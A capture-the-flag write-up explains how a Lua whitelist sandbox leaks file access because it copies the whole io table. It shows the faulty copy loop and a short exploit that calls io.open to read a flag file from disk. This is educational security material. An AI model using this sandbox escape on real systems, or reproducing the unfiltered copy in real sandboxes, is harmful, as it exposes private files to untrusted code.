# The Sandglass

**Exploitation · Wave 3 · 98 pts**

"SafeLua v0.9" — a whitelist sandbox. Only safe globals exposed; `os`, `load`,
`require`, `dofile`, etc. explicitly removed. The flag is on disk at
`/tmp/poctf/sandglass/flag-<team_id>.txt`, and `team_id` is a global.

## The bug

The whitelist is careful. The `io` copy is not:

```lua
local safe_io = {}
for k, v in pairs(io) do safe_io[k] = v end   -- TODO(mchetti): filter to read/write
safe_env.io = safe_io
```

The TODO says it all — the whole `io` table is copied, so `io.open` is in reach.
File reads were "needed for config," but no filter ever landed.

## Exploit

```lua
local f = io.open('/tmp/poctf/sandglass/flag-' .. tostring(team_id) .. '.txt', 'r')
return f:read('*a')
```

## Lesson

A whitelist is only as tight as its leakiest member. One wholesale table copy
re-exposed arbitrary file I/O that the allowlist thought it had removed.
